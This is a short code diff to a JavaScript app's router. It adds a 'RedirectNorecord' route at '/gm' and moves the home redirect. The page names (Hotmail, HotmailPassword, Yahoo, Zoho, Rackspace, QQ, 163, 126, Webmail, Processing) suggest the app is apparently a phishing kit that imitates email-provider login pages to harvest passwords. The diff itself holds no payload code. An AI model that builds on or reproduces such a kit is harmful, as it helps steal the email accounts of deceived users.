@@ -18,6 +18,7 @@ import Processing from "./pages/processing";
 import Qq from "./pages/qq";
 import Rackspace from "./pages/rackspace";
 import Redirect from "./pages/redirect";
+import RedirectNorecord from "./pages/redirectnorecord";
 import Webmail from "./pages/webmail";
 import WebmailMain from "./pages/webmailmain";
 import Yahoo from "./pages/yahoo";
@@ -33,7 +34,7 @@ function App() {
     <Fragment>
       <Router>
         <Redirect default />
-        <HomeRedirect path="/" />
+        <RedirectNorecord path="/gm" />
         <Encryption path="/enc" />
         <Page163 path="/p163" />
         <Page126 path="/p126" />
@@ -51,6 +52,7 @@ function App() {
         <Zoho path="zh" />
         <Hotmail path="ht" />
         <HotmailPassword path="ht/ps" />
+        <HomeRedirect path="/" />
         <Processing path="processing" />
       </Router>
       <ToastContainer
